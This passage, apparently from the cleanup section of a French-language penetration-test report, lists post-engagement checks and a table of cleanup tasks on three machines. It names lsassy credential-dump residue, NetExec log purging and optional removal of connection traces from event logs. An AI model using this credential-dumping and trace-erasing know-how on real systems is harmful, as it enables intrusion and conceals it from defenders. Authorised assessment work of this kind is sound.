- [x] Supprimer les tâches planifiées et services de persistance (N/A : Aucune persistance active installée)
- [x] Nettoyer les clés de registre modifiées (N/A)
- [x] Réactiver les protections temporairement coupées (N/A : Defender et le Pare-feu sont restés actifs)

## Tableau de suivi du nettoyage

| Machine | Artefact à supprimer / Vérification | Statut (Fait / À faire) | Opérateur |
| :--- | :--- | :--- | :--- |
| **FILER01** | Vérification des résidus de dump de services temporaires liés à `lsassy` | **Fait** (Nettoyage automatique validé par le module) | Admin |
| **DC01** | Suppression des fichiers de logs locaux générés sur la machine attaquante uniquement | **Fait** (Purger le cache `~/.nxc/logs/` et `~/.nxc/modules/`) | Admin |
| **DESKTOP01** | Analyse des journaux d'événements pour suppression des traces de connexion (Optionnel) | **À faire** (Selon GPO de rétention des Event Logs) | Admin |
